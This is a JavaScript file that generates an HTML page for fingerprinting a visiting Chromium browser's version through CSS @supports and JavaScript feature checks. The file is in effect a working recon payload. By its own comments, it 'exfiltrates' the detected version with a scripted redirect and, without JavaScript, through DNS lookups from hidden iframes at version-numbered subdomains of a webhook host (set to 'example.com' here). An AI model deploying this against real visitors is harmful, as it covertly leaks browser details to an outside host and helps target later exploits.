var webhook_url = "example.com"

tests = {
	'hwb-color-notation':'@supports (color: hwb(194 0% 0% / .5))',
	'inert':'js:"inert" in HTMLElement.prototype',
	'abortsignal-timeout':'js:"timeout" in AbortSignal', // partial support since 103
	'croptarget':'js:"CropTarget" in window',
	':has()': '@supports selector(:has(*))',
	'writingSuggestions':'js:"writingSuggestions" in HTMLElement.prototype',
	'view-transition-class':'@supports (view-transition-class: card)',
	'GeolocationCoordinatesToJSON':'js:"toJSON" in GeolocationCoordinates.prototype',
	'font-size-adjust':'@supports (font-size-adjust:0.5)',
	'ruby-align':'@supports (ruby-align: start)',
	'interpolate-size':'@supports (interpolate-size: numeric-only)',
	'box-decoration-break':'@supports (box-decoration-break: clone)', // removed the webkit prefix
	'font-variant-emoji': '@supports (font-variant-emoji: emoji)',
	'writing-mode: sideways-rl': '@supports (writing-mode: sideways-rl)',
	'text-box-trim': '@supports (text-box-trim: trim-both)',
	'getContextAttributes': 'js:"getContextAttributes" in OffscreenCanvasRenderingContext2D.prototype',
	'::column': '@supports selector(::column)',
	'dynamic-range-limit': '@supports (dynamic-range-limit: standard)',
	'reading-flow': '@supports (reading-flow: normal)',
	'abs()': '@supports (font-size: abs(20% - 100px))',
	'corner-shape': '@supports (corner-shape: notch)',
	'caret-animation': '@supports (caret-animation: auto)',
	// 'ariaNotify': 'js:"ariaNotify" in Element.prototype' // not supported in chromeos
	'IndexedDB-getAllRecords': 'js:"getAllRecords" in IDBObjectStore.prototype',
	// 'activeViewTransition': 'js:"activeViewTransition" in document', // js
	':target-before': '@supports selector(:target-before)',
	'font-language-override': '@supports (font-language-override: "ENG")',
	'search-text': '@supports selector(::search-text)',
	'text-justify': '@supports (text-justify: auto)',
	'trigger-scope': '@supports (trigger-scope: all)',
	'border-shape': '@supports (border-shape: none)', // weird
	'text-decoration-skip-ink: all': '@supports (text-decoration-skip-ink: all)',
	'column-rule-inset': '@supports (column-rule-inset: 0px)',

	// 107+
	'transition-interpolation': '@supports (transition: opacity ease-in-out 0.25s)',
	'Small, Large, and Dynamic viewport units': '@supports (width: 100dvh)',
	'lh': '@supports (width: 1lh)',
	':picture-in-picture': '@supports selector(:picture-in-picture)',
	'View Transitions API':'@supports (view-transition-name: header)',
	'CSS Nesting':'@supports selector(&)', // maybe improve this
	'image-set':'@supports (content: image-set("test.png"))', // removed webkit prefix
	'text-wrap: balance':'@supports (text-wrap: balance)',
	'display-multiple-keywords':'@supports (display: block flex)',
	'motion-path':'@supports (offset: ray(0deg))',
	'transition-behavior': '@supports (transition-behavior: normal)',
	'prefers-reduced-transparency': '@media (prefers-reduced-transparency: no-preference)', // todo check diff values too
	'user-valid': '@supports selector(:user-valid)',
	'details-name': 'js:"name" in HTMLDetailsElement.prototype',
	// 'scrollbar-color': '@supports (scrollbar-color: auto)', // doesnt work yet
	'Storage Buckets API': 'js:"StorageBucket" in window',
	'light-dark': '@supports (color: light-dark(lime, green))',
}

features = {
	'hwb-color-notation':[101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'inert':[102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'abortsignal-timeout':[103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'croptarget':[104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	':has()':[105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'transition-interpolation':[107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'Small, Large, and Dynamic viewport units':[108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'lh':[109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	':picture-in-picture':[110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'View Transitions API':[111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'CSS Nesting':[112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'image-set':[113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'text-wrap: balance':[114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'display-multiple-keywords':[115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'motion-path':[116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'transition-behavior':[117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'prefers-reduced-transparency':[118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'user-valid':[119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'details-name':[120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'scrollbar-color':[121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'Storage Buckets API':[122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'light-dark':[123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
	'writingSuggestions':[124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'view-transition-class':[125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'GeolocationCoordinatesToJSON':[126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'font-size-adjust':[127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'ruby-align':[128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'interpolate-size':[129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'box-decoration-break':[130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'font-variant-emoji':[131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'writing-mode: sideways-rl':[132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'text-box-trim':[133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'getContextAttributes':[134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'::column':[135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'dynamic-range-limit':[136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'reading-flow':[137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'abs':[138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'corner-shape':[139,140,141,142,143,144,145,146,147,148,149,150,151],	
	'caret-animation':[140,141,142,143,144,145,146,147,148,149,150,151],
	'IndexedDB-getAllRecords':[141,142,143,144,145,146,147,148,149,150,151],
	// 'activeViewTransition':[142,143,144,145,146,147,148,149,150,151], // js
	':target-before':[142,143,144,145,146,147,148,149,150,151],
	'font-language-override':[143,144,145,146,147,148,149,150,151],
	'search-text': [144,145,146,147,148,149,150,151],
	'text-justify': [145,146,147,148,149,150,151],
	'trigger-scope': [146,147,148,149,150,151],
	'border-shape': [147,148,149,150,151],
	'text-decoration-skip-ink: all': [148,149,150,151],
	'column-rule-inset':[149,150,151]
}

var html = "";
// html = html.concat(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">`)

var css = ""
var js = ""
var versions = Array.from(new Array(52), (x, i) => i + 100);

var i = 0;
for (feature in features) {
	if (!(feature in tests)) continue
	var test = tests[feature]
	html = html.concat(`<div data-test="${i}">${feature}</div>\n`)
	
	var supported = features[feature]
	var unsupported = versions.filter(version => !(features[feature].includes(version)))

	if (test.startsWith("js:")) {
		js = js.concat(`/* ${feature} */
			if( ${test.slice(3)}) {
				document.querySelector('[data-test="${i}"]').style.background = "green"; 
				[${`${unsupported}].forEach(version => document.querySelector('#versions [data-version="' + version + '"]').style.display = "none");`}
		    }
		   else {
				[${`${supported}].forEach(version => document.querySelector('#versions [data-version="' + version + '"]').style.display = "none");`}
		   }
		`)
	}
	else {
		css = css.concat(`/* ${feature} */
			${test} {
				[data-test="${i}"] {background:green}
				${unsupported.map(version =>`#versions [data-version="${version}"]`).join(",") + "{background:red; display:none}"}
			}
			${test.replace("@supports", "@supports not").replace("@media", "@media not")} {
				${supported.map(version =>`#versions [data-version="${version}"]`).join(",") + "{background:red; display:none}"}
			}
		`)
	}
	i++;
}

// exfiltrate with js, no csp (after 2 sec)
js = js.concat(`
	setTimeout(() => {
		[...document.querySelectorAll("#versions iframe")].filter(el => getComputedStyle(el).getPropertyValue("display") === "block").forEach(el => location = '/' + el.dataset.version)
	}, 2000)
`)


// exfiltrate through DNS without JS (iframes)
// correct version will be last dns request, increase animation duration for more delay
css = css.concat(`
#versions {
  position:fixed;
  left: -9999;
  animation: show 0s linear 1s forwards;
}

@keyframes show {
  to {
    left: 0;
  }
}
`)

html = html.concat(`<div id=versions style="display:flex; gap:5px;">
${versions.map((version, i) => `<p data-version="${version}"">${version}</p>`).join("")}
${versions.map((version, i) => `<iframe loading="lazy" src="https://${version}.${webhook_url}/" data-version="${version}"></iframe>`).join("")}
</div>
`)

html = `${html}<style>${css}</style><script defer>${js}</script>`
console.log(html)